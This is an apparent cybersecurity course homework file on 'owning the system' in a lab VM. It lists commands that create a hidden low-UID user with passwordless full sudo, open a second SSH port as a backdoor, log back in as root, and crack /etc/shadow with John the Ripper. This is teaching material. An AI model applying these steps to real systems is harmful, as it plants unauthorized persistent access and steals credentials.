## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:


                root:~\ $ adduser --no-create-home sysd

![create_user_no_home](image/add_user_no_home2.png)



       



2. Give your secret user a password: 


        root:~\ $ passwd sysd

![set_up_password](image/set_up_password2.png)




3. Give your secret user a system UID < 1000:

                 root:~\ $ usermod -u 14 sysd
       

![change_UID](image/change_group_GID2.png)



        

4. Give your secret user the same GID:


        root:~\ $ sudo groupmod -g 14 sysd


![change_group_GID](image/change_group_GID3.png)



5. Give your secret user full `sudo` access without the need for a password:


        sysd ALL=(ALL) NOPASSWD:ALL


![sudo_access_no_password](image/Sudo_access_without_password.png)



6. Test that `sudo` access works without your password:


        sysd@scavenger-hunt:/etc$ sudo visudo



![No_password](image/verifying_root_access_wo_password%20.png)








**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

root:ssh\ $ nano sshd_config




![Editing_sshd_config](image/Nano_sshd_config.png)


**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:


root:ssh\ $ sudo systemctl reload ssh



![Restarting_sshd](image/Changing_ports_in_sshd_config.png)



2. Exit the `root` account:

        root:~\ $ su sysadmin

![Switch_user](image/Switch_user.png)



3. SSH to the target machine using your `sysd` account and port `2222`:

                ssh sysd@192.168.6.105 -p 2222


![ssh_command_backintosystem](image/ssh_command_backintosystem.png)



4. Use `sudo` to switch to the root user.


                sysd@scavenger-hunt:~$ sudo -s

![switch_user_to_root](image/switch_user_to_root.png)



**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

root@scavenger-hunt:~# ssh sysd@192.168.6.105 -p 2222


2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

                root@scavenger-hunt:/# sudo john shadow_copy

![john_the ripper](image/John_the_ripper_hashtags.png)



---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

